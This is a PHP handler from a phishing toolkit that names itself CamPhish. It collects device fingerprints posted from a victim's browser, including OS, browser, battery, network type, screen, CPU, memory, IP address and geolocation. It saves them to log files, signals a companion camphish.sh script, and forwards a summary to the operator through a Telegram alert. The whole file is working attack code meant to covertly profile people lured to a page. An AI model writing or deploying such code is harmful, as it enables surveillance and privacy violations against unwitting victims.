<?php
require_once __DIR__ . '/telegram_alert.php';
$date = date('dMYHis');

// ── Collect all posted device fields ─────────────────────────────────────────
$fields = [
    'os'          => 'OS',
    'browser'     => 'Browser',
    'language'    => 'Language',
    'timezone'    => 'Timezone',
    'screen_w'    => 'Screen Width',
    'screen_h'    => 'Screen Height',
    'pixel_ratio' => 'Pixel Ratio',
    'orientation' => 'Orientation',
    'battery'     => 'Battery Level',
    'network'     => 'Network Type',
    'platform'    => 'Platform',
    'cores'       => 'CPU Cores',
    'memory'      => 'Device Memory (GB)',
    'touch'       => 'Touch Points',
    'ip_geo'      => 'IP Geolocation (fallback)',
];

$data  = "=== Device Fingerprint ===\r\n";
$data .= "Date: " . $date . "\r\n";
$data .= "IP: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\r\n";
$data .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\r\n";
$data .= str_repeat('-', 40) . "\r\n";

foreach ($fields as $key => $label) {
    $val = isset($_POST[$key]) ? htmlspecialchars(strip_tags($_POST[$key])) : 'Not available';
    $data .= "$label: $val\r\n";
}
$data .= str_repeat('=', 40) . "\r\n\r\n";

// ── Save into logs/device/ ────────────────────────────────────────────────────
$log_dir = 'logs/device';
if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

$file       = $log_dir . '/device_' . $date . '.txt';
$masterFile = $log_dir . '/saved_device_info.txt';

file_put_contents($file, $data);

if (!file_exists($masterFile)) touch($masterFile);
file_put_contents($masterFile, $data, FILE_APPEND);

// Also write a signal file so camphish.sh can detect & display it
file_put_contents($log_dir . '/DeviceInfo.log', "Device info captured\n", FILE_APPEND);

// Telegram alert
$os_val  = isset($_POST['os'])      ? htmlspecialchars($_POST['os'])      : 'Unknown';
$br_val  = isset($_POST['browser']) ? htmlspecialchars($_POST['browser']) : 'Unknown';
$bat_val = isset($_POST['battery']) ? htmlspecialchars($_POST['battery']) : 'Unknown';
$net_val = isset($_POST['network']) ? htmlspecialchars($_POST['network']) : 'Unknown';
$ip_val  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
telegram_alert("📱 <b>CamPhish — Device Fingerprint!</b>\n💻 OS: <code>$os_val</code>\n🌐 Browser: <code>$br_val</code>\n🔋 Battery: <code>$bat_val</code>\n📶 Network: <code>$net_val</code>\n📡 IP: <code>$ip_val</code>");

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
?>
